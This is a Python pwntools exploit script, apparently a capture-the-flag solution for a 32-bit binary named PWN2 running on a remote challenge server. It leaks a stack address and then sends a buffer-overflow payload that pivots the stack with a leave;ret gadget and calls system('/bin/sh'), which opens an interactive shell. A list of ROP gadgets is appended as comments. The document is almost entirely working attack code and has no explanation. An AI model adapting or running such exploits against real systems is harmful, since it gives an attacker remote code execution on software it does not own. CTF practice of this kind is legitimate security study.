from pwn import *
context(log_level='debug',arch='x86',terminal=['tmux','splitw','-h'])

# io=process("./PWN2")
elf=ELF("./PWN2")
io=remote("node2.anna.nssctf.cn",28821)

read_text=0x80485DA
leave_ret=0x080484b8
sys_addr=elf.sym["system"]

io.recvuntil(b"name?\n")
io.send(cyclic(0x28))

leak_addr=u32(io.recvuntil(b"\xff")[-4:])
print("leak_addr :"+hex(leak_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b"\n")
payload1=b"aaaa"+p32(sys_addr)+p32(0)+p32(leak_addr-0x28)+b"/bin/sh\x00"
payload1=payload1.ljust(0x28,b'\x00')+p32(leak_addr-0x38)+p32(leave_ret)
io.send(payload1)

io.interactive()

# Gadgets information
# ============================================================
# 0x080484b8 : leave ; ret
# 0x0804869b : pop ebp ; ret
# 0x08048698 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080483bd : pop ebx ; ret
# 0x0804869a : pop edi ; pop ebp ; ret
# 0x08048699 : pop esi ; pop edi ; pop ebp ; ret
# 0x080483a6 : ret
# 0x080484ce : ret 0xeac1

# Unique gadgets found: 8
